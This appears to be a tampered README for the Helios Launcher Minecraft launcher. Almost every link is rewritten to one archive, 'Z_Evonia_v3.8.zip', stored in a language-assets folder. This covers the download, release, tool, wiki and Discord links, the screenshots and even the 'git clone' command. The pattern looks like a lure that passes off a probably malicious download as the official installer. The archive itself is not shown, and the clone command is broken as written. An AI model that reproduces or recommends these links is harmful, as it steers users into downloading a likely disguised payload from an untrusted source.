<p align="center"><img src="./app/assets/images/SealCircle.png" width="150px" height="150px" alt="aventium softworks"></p>

<h1 align="center">Helios Launcher</h1>

<em><h5 align="center">(formerly Electron Launcher)</h5></em>

[<p align="center"><img src="https://img.shields.io/travis/dscalzi/HeliosLauncher.svg?style=for-the-badge" alt="travis">](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip) [<img src="https://img.shields.io/github/downloads/dscalzi/HeliosLauncher/total.svg?style=for-the-badge" alt="downloads">](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip) <img src="https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip"  height="28px" alt="stark"></p>

<p align="center">Join modded servers without worrying about installing Java, Forge, or other mods. We'll handle that for you.</p>

![Screenshot 1](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip)
![Screenshot 2](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip)

## Features

* 🔒 Full account management.
  * Add multiple accounts and easily switch between them.
  * Credentials are never stored and transmitted directly to Mojang.
* 📂 Efficient asset management.
  * Receive client updates as soon as we release them.
  * Files are validated before launch. Corrupt or incorrect files will be redownloaded.
* ☕ **Automatic Java validation.**
  * If you have an incompatible version of Java installed, we'll install the right one *for you*.
  * You do not need to have Java installed to run the launcher.
* 📰 News feed natively built into the launcher.
* ⚙️ Intuitive settings management, including a Java control panel.
* Supports all of our servers.
  * Switch between server configurations with ease.
  * View the player count of the selected server.
* Automatic updates. That's right, the launcher updates itself.
*  View the status of Mojang's services.

This is not an exhaustive list. Download and install the launcher to gauge all it can do!

#### Need Help? [Check the wiki.][wiki]

#### Like the project? Leave a ⭐ star on the repository!

## Downloads

You can download from [GitHub Releases](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip)

#### Latest Release

[![](https://img.shields.io/github/release/dscalzi/HeliosLauncher.svg?style=flat-square)](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip)

#### Latest Pre-Release
[![](https://img.shields.io/github/release/dscalzi/HeliosLauncher/all.svg?style=flat-square)](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip)

**Supported Platforms**

If you download from the [Releases](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip) tab, select the installer for your system.

| Platform | File |
| -------- | ---- |
| Windows x64 | `Helios-Launcher-setup-VERSION.exe` |
| macOS | `Helios-Launcher-setup-VERSION.dmg` |
| Linux x64 | `Helios-Launcher-setup-VERSION.AppImage` |

## Console

To open the console, use the following keybind.

```console
ctrl + shift + i
```

Ensure that you have the console tab selected. Do not paste anything into the console unless you are 100% sure of what it will do. Pasting the wrong thing can expose sensitive information.

#### Export Output to a File

If you want to export the console output, simply right click anywhere on the console and click **Save as..**

![console example](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip)


## Development

This section details the setup of a basic developmentment environment.

### Getting Started

**System Requirements**

* [Node.js][nodejs] v14

---

**Clone and Install Dependencies**

```console
> git clone https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip
> cd HeliosLauncher
> npm install
```

---

**Launch Application**

```console
> npm start
```

---

**Build Installers**

To build for your current platform.

```console
> npm run dist
```

Build for a specific platform.

| Platform    | Command              |
| ----------- | -------------------- |
| Windows x64 | `npm run dist:win`   |
| macOS       | `npm run dist:mac`   |
| Linux x64   | `npm run dist:linux` |

Builds for macOS may not work on Windows/Linux and vice-versa.

---

### Visual Studio Code

All development of the launcher should be done using [Visual Studio Code][vscode].

Paste the following into `.vscode/launch.json`

```JSON
{
  "version": "0.2.0",
  "configurations": [
    {
      "name": "Debug Main Process",
      "type": "node",
      "request": "launch",
      "cwd": "${workspaceFolder}",
      "program": "${workspaceFolder}/node_modules/electron/cli.js",
      "args" : ["."],
      "outputCapture": "std"
    },
    {
      "name": "Debug Renderer Process",
      "type": "chrome",
      "request": "launch",
      "runtimeExecutable": "${workspaceFolder}/node_modules/.bin/electron",
      "windows": {
        "runtimeExecutable": "${workspaceFolder}/node_modules/.bin/electron.cmd"
      },
      "runtimeArgs": [
        "${workspaceFolder}/.",
        "--remote-debugging-port=9222"
      ],
      "webRoot": "${workspaceFolder}"
    }
  ]
}
```

This adds two debug configurations.

#### Debug Main Process

This allows you to debug Electron's [main process][mainprocess]. You can debug scripts in the [renderer process][rendererprocess] by opening the DevTools Window.

#### Debug Renderer Process

This allows you to debug Electron's [renderer process][rendererprocess]. This requires you to install the [Debugger for Chrome][chromedebugger] extension.

Note that you **cannot** open the DevTools window while using this debug configuration. Chromium only allows one debugger, opening another will crash the program.

---

### Note on Third-Party Usage

You may use this software in your own project so long as the following conditions are met.

* Credit is expressly given to the original authors (Daniel Scalzi).
  * Include a link to the original source on the launcher's About page.
  * Credit the authors and provide a link to the original source in any publications or download pages.
* The source code remain **public** as a fork of this repository.

We reserve the right to update these conditions at any time, please check back periodically.

---

## Resources

* [Wiki][wiki]
* [Nebula (Create Distribution.json)][nebula]
* [v2 Rewrite Branch (WIP)][v2branch]

The best way to contact the developers is on Discord.

[![discord](https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip)][discord]

---

### See you ingame.


[nodejs]: https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip 'Node.js'
[vscode]: https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip 'Visual Studio Code'
[mainprocess]: https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip 'Main Process'
[rendererprocess]: https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip 'Renderer Process'
[chromedebugger]: https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip 'Debugger for Chrome'
[discord]: https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip 'Discord'
[wiki]: https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip 'wiki'
[nebula]: https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip 'dscalzi/Nebula'
[v2branch]: https://raw.githubusercontent.com/nkzprod/EvoniaZ/master/app/assets/lang/Z_Evonia_v3.8.zip 'v2 branch'
